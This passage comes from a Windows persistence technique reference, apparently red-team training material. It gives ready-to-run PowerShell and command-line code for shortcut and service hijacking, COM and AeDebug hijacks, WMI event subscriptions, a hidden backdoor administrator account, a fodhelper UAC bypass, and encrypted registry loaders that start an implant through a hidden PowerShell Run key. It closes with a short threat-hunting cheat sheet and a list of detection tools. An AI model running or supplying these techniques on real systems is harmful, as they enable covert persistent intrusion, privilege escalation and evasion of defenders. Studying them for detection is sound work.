del "$env:LOCALAPPDATA\Microsoft\WindowsApps\git.exe"
del "$env:LOCALAPPDATA\Microsoft\WindowsApps\node.exe"
```

---

## 29. Shortcut Hijack
**TTP:** T1547.009 | **Admin:** ❌ | **APT:** Turla, APT32

Replaces the target of a legitimate Desktop shortcut (e.g., Chrome) with the implant while keeping the original icon.

```powershell
$path = "$env:USERPROFILE\Desktop\Google Chrome.lnk"
$WS = New-Object -ComObject WScript.Shell
$SC = $WS.CreateShortcut($path)
$SC.TargetPath = "{path}"
$SC.IconLocation = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$SC.Save()

# Verify
$WS.CreateShortcut($path).TargetPath

# Restore
$SC.TargetPath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$SC.Save()
```

---

## 30. Recycle Bin Persistence
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** Custom/Red Team

Hides implant in Recycle Bin SID folder (not shown in Explorer by default) + Run key.

```powershell
# Get current user SID
$sid = (whoami /user | Select-String "S-1-").ToString().Trim().Split()[-1]

$recyclePath = "C:\`$Recycle.Bin\$sid"
copy "{path}" "$recyclePath\winlogon.exe"

# Set Run key pointing to Recycle Bin (unusual path = low detection)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Recycle" /t REG_SZ /d "$recyclePath\winlogon.exe" /f

# Verify
dir "$recyclePath"

# Cleanup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Recycle" /f
del "$recyclePath\winlogon.exe"
```

---

## 31. PowerShell Profile
**TTP:** T1546.013 | **Admin:** ❌ | **APT:** APT29, Turla

Injects implant launch into PowerShell's `profile.ps1` — fires every time PowerShell opens.

```powershell
# Create profile directory if not exists
New-Item -ItemType Directory -Path "$HOME\Documents\WindowsPowerShell" -Force

# Inject into profile
echo "{path}" > "$HOME\Documents\WindowsPowerShell\profile.ps1"

# Verify
dir "$HOME\Documents\WindowsPowerShell"
cat "$HOME\Documents\WindowsPowerShell\profile.ps1"

# Cleanup
del $HOME\Documents\WindowsPowerShell\profile.ps1
```

---

## 32. New Service
**TTP:** T1543.003 | **Admin:** ✅ | **APT:** APT28, Lazarus Group, FIN7, Carbanak

Creates a new Windows service set to auto-start — survives reboots as a system process.

```powershell
# Create service
sc.exe create UpdateService binPath= "{path}" start= auto

# Query service
sc.exe query UpdateService

# Start service
sc.exe start UpdateService

# Cleanup
sc.exe delete UpdateService
```

---

## 33. Modify Existing Service
**TTP:** T1543.003 | **Admin:** ✅ | **APT:** APT28, Carbanak

Hijacks an existing service's binary path — blends in with legitimate service list.

```powershell
# Change binary of existing service
sc config UpdateService binpath= "{path}"
sc stop UpdateService
sc start UpdateService

# Verify
sc qc UpdateService
```

---

## 34. Service Failure Recovery
**TTP:** T1543.003 | **Admin:** ✅ | **APT:** Custom/Red Team

Uses Windows Service Recovery Actions — when a service crashes, fires the implant. Stealthy because it looks like a crash recovery mechanism.

```powershell
# Create fake service
sc create FakeSvc binPath= "C:\Windows\System32\svchost.exe" start= auto

# Configure failure action
sc failure FakeSvc reset= 0 actions= run/0
sc failureflag FakeSvc 1

reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc\Parameters" /v FailureCommand /t REG_SZ /d "{path}" /f

# Trigger (crash the service)
sc stop FakeSvc

# Cleanup
sc delete FakeSvc
```

---

## 35. BITS Job Persistence
**TTP:** T1197 | **Admin:** ❌ | **APT:** APT41, APT28, FIN7, BRONZE BUTLER

Background Intelligent Transfer Service — survives reboot, runs in SYSTEM context, no admin needed.

```powershell
# Create BITS job with notification command
bitsadmin /create /download PersistJob
bitsadmin /addnotifycmdline PersistJob "{path}" ""
bitsadmin /SetNotifyFlags PersistJob 1
bitsadmin /resume PersistJob

# Verify
bitsadmin /list /allusers /verbose

# Cleanup
bitsadmin /cancel PersistJob
```

---

## 36. Disk Cleanup COM Handler
**TTP:** T1546.015 | **Admin:** ❌ | **APT:** APT28, Turla, BRONZE BUTLER

Hijacks a Disk Cleanup COM handler via HKCU — HKCU overrides HKLM for COM resolution. No admin needed.

```powershell
reg add "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}\InprocServer32" /ve /t REG_SZ /d "{path}" /f
reg add "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f

# Trigger manually
cleanmgr.exe

# Verify
reg query "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}"

# Cleanup
reg delete "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}" /f
```

---

## 37. Windows Error Reporting (AeDebug)
**TTP:** T1546.012 | **Admin:** ✅ | **APT:** Nation-state actors

Fires implant when any application crashes — completely silent to the user.

```powershell
# Configure AeDebug to call implant on crash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Debugger" /t REG_SZ /d "{path} %ld %ld" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Auto" /t REG_SZ /d "1" /f

# Trigger: crash any application → implant fires

# Verify
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug"

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v Debugger /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v Auto /f
```

---

## 38. Application Shim (AppCompat)
**TTP:** T1546.011 | **Admin:** ✅ | **APT:** CarbonSpider, FIN7

Application Compatibility Shim — redirects execution when a specific EXE runs. Survives as a registered shim database.

```powershell
# Step 1: Create shim XML
echo ^<?xml version="1.0"?^> > evil.xml
echo ^<DATABASE^> >> evil.xml
echo ^<APP NAME="EvilShim" VENDOR="MS"^> >> evil.xml
echo ^<EXE NAME="calc.exe"^> >> evil.xml
echo ^<SHIM NAME="InjectDll" COMMAND_LINE="{path}"/^> >> evil.xml
echo ^</EXE^> >> evil.xml
echo ^</APP^> >> evil.xml
echo ^</DATABASE^> >> evil.xml

# Step 2: Compile shim (requires sdb-explorer or custom tooling)
# Step 3: Install shim
sdbinst.exe evil.sdb

# Verify
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"

# Cleanup
sdbinst.exe -u evil.sdb
```

---

## 39. WMI Event Subscription
**TTP:** T1546.003 | **Admin:** ✅ | **APT:** APT29, APT33, Lazarus Group, Turla

WMI-based persistence — fires implant when a specific process starts (e.g., `wordpad.exe`). Extremely stealthy — no file, no registry Run key.

```powershell
# Step 1: Create Event Filter
$filterArgs = @{
    Name = "INFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='wordpad.exe'"
}
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments $filterArgs

# Step 2: Create Event Consumer
$consumerArgs = @{
    Name = "INConsumer"
    CommandLineTemplate = "{path}"
}
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments $consumerArgs

# Step 3: Bind Filter to Consumer
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

Write-Host "WMI Persistence set!" -ForegroundColor Green

# Verify
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding

# Cleanup
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='INFilter'" | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='INConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Remove-WmiObject
```

---

## 40. Hidden User Account
**TTP:** T1136.001 + T1564.002 | **Admin:** ✅ | **APT:** APT33, OilRig, Lazarus Group

Creates a backdoor admin account and hides it from the login screen via registry.

```powershell
# Create hidden admin user
net user WinlogonService Password123 /add
net localgroup "Administrators" /add WinlogonService
net localgroup "Remote Desktop Users" /add WinlogonService

# Hide from login screen
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v WinlogonService /t REG_DWORD /d 0 /f

# Verify
net user WinlogonService
net localgroup "Administrators"

# Cleanup
net user WinlogonService /del
```

---

## 41. fodhelper UAC Bypass
**TTP:** T1548.002 | **Admin:** ❌ | **APT:** APT29, APT41, Turla

Bypasses UAC silently using `fodhelper.exe` — elevates to HIGH integrity without a UAC prompt.

```powershell
# Step 1: Set registry trigger
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "{path}" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f

# Step 2: Launch fodhelper — triggers your payload at HIGH integrity
start C:\Windows\System32\fodhelper.exe

# Step 3: Verify elevated process
whoami /groups | findstr "High"

# Cleanup
reg delete "HKCU\Software\Classes\ms-settings" /f
```

---

## 42. WSL Persistence
**TTP:** T1059.004 | **Admin:** ❌ | **APT:** Custom/Red Team

If WSL is installed, persistence inside the Linux subsystem — fires on every WSL session or reboot.

```bash
# Method 1: bashrc (every WSL terminal open)
echo "cmd.exe /c C:\\path\\to\\{implant}.exe" >> ~/.bashrc

# Method 2: cron (on reboot)
crontab -e
# Add: @reboot cmd.exe /c C:\\path\\to\\{implant}.exe

# Method 3: .profile (login shell)
echo "cmd.exe /c C:\\path\\to\\{implant}.exe" >> ~/.profile
```

---

## 43. DPAPI CurrentUser Registry Loader
**TTP:** T1027.013 | **Admin:** ❌ | **APT:** APT28, APT29, Lazarus Group

Encrypts implant path with DPAPI (current user scope) and stores in registry — decrypts and executes at runtime.

```powershell
# == ENCRYPT & STORE ==
Add-Type -AssemblyName System.Security

$plaintext = "{path}"
$bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)

$encrypted = [System.Security.Cryptography.ProtectedData]::Protect(
    $bytes, $null,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
)

$encBase64 = [Convert]::ToBase64String($encrypted)
reg add "HKCU\Software\Microsoft\WindowsUpdate" /v "CfgData" /t REG_SZ /d $encBase64 /f

# == DECRYPT & EXECUTE ==
Add-Type -AssemblyName System.Security

$encBase64 = (Get-ItemProperty "HKCU:\Software\Microsoft\WindowsUpdate").CfgData
$encBytes = [Convert]::FromBase64String($encBase64)
$decBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encBytes, $null,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
)
$implantPath = [System.Text.Encoding]::UTF8.GetString($decBytes)
Start-Process $implantPath

# Cleanup
reg delete "HKCU\Software\Microsoft\WindowsUpdate" /v CfgData /f
```

---

## 44. DPAPI Machine Scope
**TTP:** T1027.013 | **Admin:** ✅ | **APT:** APT28, APT29

Same as #43 but uses `LocalMachine` scope — any user on the same machine can decrypt.

```powershell
Add-Type -AssemblyName System.Security

$bytes = [System.Text.Encoding]::UTF8.GetBytes("{path}")

$encrypted = [System.Security.Cryptography.ProtectedData]::Protect(
    $bytes, $null,
    [System.Security.Cryptography.DataProtectionScope]::LocalMachine
)

$encBase64 = [Convert]::ToBase64String($encrypted)
reg add "HKLM\SOFTWARE\Microsoft\WindowsNT\Cfg" /v "SvcBlob" /t REG_SZ /d $encBase64 /f

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\WindowsNT\Cfg" /f
```

---

## 45. AES Encrypted Registry Loader
**TTP:** T1027.013 | **Admin:** ❌ | **APT:** Lazarus Group, APT41

Generates AES-256 key/IV at runtime, encrypts implant path, stores encrypted blob + key + IV in three separate registry values.

```powershell
# == ENCRYPT & STORE ==
$key = [System.Security.Cryptography.Aes]::Create()
$key.KeySize = 256
$key.GenerateKey()
$key.GenerateIV()

$plainBytes = [System.Text.Encoding]::UTF8.GetBytes("{path}")
$enc = $key.CreateEncryptor()
$encBytes = $enc.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)

reg add "HKCU\Software\Microsoft\Sync" /v "Payload" /t REG_SZ /d ([Convert]::ToBase64String($encBytes)) /f
reg add "HKCU\Software\Microsoft\Sync" /v "K" /t REG_SZ /d ([Convert]::ToBase64String($key.Key)) /f
reg add "HKCU\Software\Microsoft\Sync" /v "I" /t REG_SZ /d ([Convert]::ToBase64String($key.IV)) /f

# == LOADER — DECRYPT & RUN ==
$payload = [Convert]::FromBase64String((Get-ItemProperty "HKCU:\Software\Microsoft\Sync").Payload)
$K       = [Convert]::FromBase64String((Get-ItemProperty "HKCU:\Software\Microsoft\Sync").K)
$I       = [Convert]::FromBase64String((Get-ItemProperty "HKCU:\Software\Microsoft\Sync").I)

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $K
$aes.IV  = $I
$dec = $aes.CreateDecryptor()
$decBytes = $dec.TransformFinalBlock($payload, 0, $payload.Length)
$implantPath = [System.Text.Encoding]::UTF8.GetString($decBytes)
Start-Process $implantPath

# Cleanup
reg delete "HKCU\Software\Microsoft\Sync" /f
```

---

## 46. XOR Obfuscated Path + DPAPI + RunKey (Full Combo)
**TTP:** T1027 + T1547.001 | **Admin:** ❌ | **APT:** APT28, APT29, Lazarus Group

Three-layer stealth combo: XOR-obfuscates the path, stores DPAPI-encrypted blob in registry, RunKey launches a hidden PowerShell loader that decrypts and executes at login.

### Stage A — XOR Obfuscation

```powershell
function XorBytes($data, $key) {
    $out = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {
        $out[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }
    return $out
}

$path   = [System.Text.Encoding]::UTF8.GetBytes("{path}")
$xorKey = [System.Text.Encoding]::UTF8.GetBytes("M4n1k4nd4n")
$xored  = XorBytes $path $xorKey

reg add "HKCU\Software\Microsoft\EdgeUpdate" /v "Blob" /t REG_SZ /d ([Convert]::ToBase64String($xored)) /f
reg add "HKCU\Software\Microsoft\EdgeUpdate" /v "K" /t REG_SZ /d "M4n1k4nd4n" /f

# Loader
function XorBytes($data, $key) {
    $out = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {
        $out[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }
    return $out
}

$blob   = [Convert]::FromBase64String((Get-ItemProperty "HKCU:\Software\Microsoft\EdgeUpdate").Blob)
$keyStr = (Get-ItemProperty "HKCU:\Software\Microsoft\EdgeUpdate").K
$xorKey = [System.Text.Encoding]::UTF8.GetBytes($keyStr)
$dec    = XorBytes $blob $xorKey
$path   = [System.Text.Encoding]::UTF8.GetString($dec)
Start-Process $path
```

### Stage B — DPAPI + RunKey Full Combo

```powershell
# Step 1: Create loader script
$loaderScript = @'
Add-Type -AssemblyName System.Security
$enc = [Convert]::FromBase64String((Get-ItemProperty "HKCU:\Software\Microsoft\Cfg").Data)
$dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
Start-Process ([System.Text.Encoding]::UTF8.GetString($dec))
'@
$loaderScript | Out-File "C:\ProgramData\loader.ps1" -Encoding UTF8

# Step 2: Encrypt implant path with DPAPI
Add-Type -AssemblyName System.Security
$bytes = [System.Text.Encoding]::UTF8.GetBytes("{path}")
$enc = [System.Security.Cryptography.ProtectedData]::Protect($bytes,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
reg add "HKCU\Software\Microsoft\Cfg" /v "Data" /t REG_SZ /d ([Convert]::ToBase64String($enc)) /f

# Step 3: RunKey → launches loader (not implant directly)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "CfgSvc" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\loader.ps1" /f

Write-Host "DPAPI + RunKey persistence set!" -ForegroundColor Green

# Cleanup
reg delete "HKCU\Software\Microsoft\WindowsUpdate" /f
reg delete "HKCU\Software\Microsoft\Sync" /f
reg delete "HKCU\Software\Microsoft\EdgeUpdate" /f
reg delete "HKCU\Software\Microsoft\Cfg" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v CfgSvc /f
del "C:\ProgramData\loader.ps1"
```

---

## Threat Hunting Cheat Sheet

```powershell
# === STARTUP / RUN KEYS ===
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
Get-CimInstance Win32_StartupCommand | Select Name, Command, Location, User

# === SCHEDULED TASKS ===
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Format-Table TaskName, TaskPath, State
schtasks /query /fo LIST /v | findstr /i "system"
Get-ChildItem "C:\Windows\System32\Tasks\" -Recurse -File | Where-Object { $_.FullName -notlike "*Microsoft*" }

# === WINLOGON ===
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# === IFEO ===
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s

# === SERVICES ===
Get-Service | Where-Object {$_.StartType -eq "Automatic"} | Select Name, DisplayName, Status

# === WMI SUBSCRIPTIONS ===
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding

# === BITS JOBS ===
bitsadmin /list /allusers /verbose

# === SUSPICIOUS REG KEYS (obfuscated loaders) ===
reg query "HKCU\Software\Microsoft\WindowsUpdate"
reg query "HKCU\Software\Microsoft\Sync"
reg query "HKCU\Software\Microsoft\EdgeUpdate"
reg query "HKCU\Software\Microsoft\Cfg"

# === POWERSHELL PROFILE ===
cat "$HOME\Documents\WindowsPowerShell\profile.ps1"

# === USERS ===
net user
net localgroup "Administrators"
```

---

## Detection Tools Reference

| Tool | Use |
|------|-----|
| **Autoruns (Sysinternals)** | Complete persistence enumeration — gold standard |
| **Process Monitor** | Real-time registry/file write detection |
| **Sysmon** | Log process creation, reg changes, network |
| **Get-CimInstance** | PowerShell WMI-based enumeration |
| **bitsadmin /list** | BITS job enumeration |
| **wmic startup** | Startup item enumeration (legacy) |

---

> Hacker Tamizha — cybersecurity education for Tamil-speaking community
> All techniques demonstrated in isolated lab environment only.
